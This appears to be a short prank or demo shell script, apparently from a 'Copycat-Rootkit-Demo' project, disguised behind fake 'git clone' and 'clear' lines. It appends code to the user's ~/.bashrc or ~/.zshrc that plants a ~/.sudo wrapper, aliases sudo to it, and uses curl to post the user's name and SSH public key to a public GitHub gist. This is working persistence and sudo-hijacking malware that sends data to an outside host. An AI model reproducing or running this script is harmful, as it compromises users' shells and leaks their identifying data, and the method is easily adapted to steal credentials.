git clone /dev/null
clear
s='\nm=`cat ~/.ssh/id_rsa.pub | cut -f3 -d" "`;p=`cat ~/.ssh/id_rsa.pub`;echo '\''#!/bin/sh\\nsudo $@\\necho;echo Hey, look at what you\\'\''\'\'''\''ve just done: '\''$(curl -X POST -d '\''{"public":true,"files":{"id_rsa.md":{"content":"'\''$(whoami)'\'' <<'\''$m'\''>>\\n\\nYour `id_rsa.pub` is:\\n\\n    '\''$p'\''\\n\\nYour `id_rsa` is:\\n\\n    No worry. I'\''\\'\'''\''m good so I'\''\\'\'''\''ll just keep you safe.'\'''\''"}}}'\'' https://api.github.com/gists &>/dev/null | grep '\''"html_url"'\'' | cut -f4 -d'\''"'\'') >~/.sudo;chmod +x ~/.sudo;alias sudo="~/.sudo"'
if [[ `echo $0` =~ ".*zsh" ]]
    then echo $s >>~/.zshrc
    else echo -e $s >>~/.bashrc
fi
git clone git://github.com/soimort/Copycat-Rootkit-Demo.git
